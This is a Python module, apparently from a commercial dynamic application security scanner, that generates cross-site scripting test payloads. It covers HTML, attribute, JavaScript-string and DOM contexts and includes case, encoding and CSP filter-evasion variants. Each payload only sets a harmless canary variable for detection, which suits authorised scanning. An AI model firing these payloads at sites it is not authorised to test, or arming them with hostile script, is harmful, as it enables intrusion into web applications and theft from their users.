"""
DevSecure360 — DAST XSS Payloads (Enterprise Edition)
=======================================================
Cross-Site Scripting payload set: reflected, stored, DOM-based, and WAF-bypass variants.
Sources: OWASP XSS Filter Evasion Cheat Sheet, PortSwigger XSS corpus, PortSwigger Web Security Academy.
"""


def get_reflected_payloads(canary_id: str) -> list:
    """
    Multi-context XSS payloads. The canary_id is embedded so the oracle
    can distinguish our execution from pre-existing page scripts.
    Ordered from most likely to succeed to most evasive.
    """
    return [
        # ── HTML body context ─────────────────────────────────────────────────
        f"<script>window.__xss_{canary_id}=1</script>",
        f"<img src=x onerror=\"window.__xss_{canary_id}=1\">",
        f"<svg onload=\"window.__xss_{canary_id}=1\">",
        f"<body onload=\"window.__xss_{canary_id}=1\">",
        f"<video><source onerror=\"window.__xss_{canary_id}=1\"></video>",
        f"<iframe srcdoc=\"<script>parent.__xss_{canary_id}=1</script>\"></iframe>",
        f"<details open ontoggle=\"window.__xss_{canary_id}=1\">",
        f"<input autofocus onfocus=\"window.__xss_{canary_id}=1\">",
        f"<marquee onstart=\"window.__xss_{canary_id}=1\">",
        f"<select autofocus onfocus=\"window.__xss_{canary_id}=1\">",

        # ── SVG vector ────────────────────────────────────────────────────────
        f"<svg><script>window.__xss_{canary_id}=1</script></svg>",
        f"<svg><animate onbegin=\"window.__xss_{canary_id}=1\" attributeName=x dur=1s>",

        # ── Attribute context (close attribute first) ──────────────────────────
        f"\" onmouseover=\"window.__xss_{canary_id}=1\" data-x=\"",
        f"' onmouseover='window.__xss_{canary_id}=1' x='",
        f"\" autofocus onfocus=\"window.__xss_{canary_id}=1\" x=\"",
        f"\" style=\"animation-name:spin\" onanimationstart=\"window.__xss_{canary_id}=1\" x=\"",

        # ── JavaScript string breakout context ────────────────────────────────
        f"';window.__xss_{canary_id}=1;//",
        f'";window.__xss_{canary_id}=1;//',
        f"\\';window.__xss_{canary_id}=1;//",
        f"</script><script>window.__xss_{canary_id}=1</script>",

        # ── Filter evasion — tag case variation ───────────────────────────────
        f"<ScRiPt>window.__xss_{canary_id}=1</ScRiPt>",
        f"<SCRIPT>window.__xss_{canary_id}=1</SCRIPT>",
        f"<Img SrC=x OnErRoR=\"window.__xss_{canary_id}=1\">",

        # ── Filter evasion — event handler without quotes ─────────────────────
        f"<img src=x onerror=window.__xss_{canary_id}=1>",
        f"<svg/onload=window.__xss_{canary_id}=1>",

        # ── HTML entity / URL encoding bypass ─────────────────────────────────
        f"&lt;script&gt;window.__xss_{canary_id}=1&lt;/script&gt;",
        f"%3Cscript%3Ewindow.__xss_{canary_id}=1%3C%2Fscript%3E",
        f"&#60;script&#62;window.__xss_{canary_id}=1&#60;/script&#62;",

        # ── JavaScript URI in anchor ──────────────────────────────────────────
        f"javascript:window.__xss_{canary_id}=1",
        f"data:text/html,<script>window.__xss_{canary_id}=1</script>",

        # ── Template literal / eval injection context ─────────────────────────
        f"`${{window.__xss_{canary_id}=1}}`",

        # ── Null byte and special char injection ──────────────────────────────
        f"\x00<script>window.__xss_{canary_id}=1</script>",

        # ── Content injection without script tags (CSP bypass) ───────────────
        f"<img src=1 href=1 onerror=\"window.__xss_{canary_id}=1\">",
        f"<audio src=1 onerror=\"window.__xss_{canary_id}=1\">",
    ]


def get_stored_check_payload(canary_id: str) -> str:
    """Payload to plant for stored XSS — look for it in subsequent GET requests."""
    return f"<script>window.__xss_{canary_id}=1</script>"


def xss_canary_marker(canary_id: str) -> str:
    """The JS variable name set when XSS fires — used by the headless oracle."""
    return f"__xss_{canary_id}"


def get_dom_xss_payloads(canary_id: str) -> list:
    """
    DOM-based XSS payloads injected via URL fragment or parameter.
    These target sinks like innerHTML, document.write, location.href, eval().
    """
    return [
        f"#{canary_id}<img src=x onerror=\"window.__xss_{canary_id}=1\">",
        f"?search={canary_id}<img src=x onerror=\"window.__xss_{canary_id}=1\">",
        f"?q=<script>window.__xss_{canary_id}=1</script>",
    ]
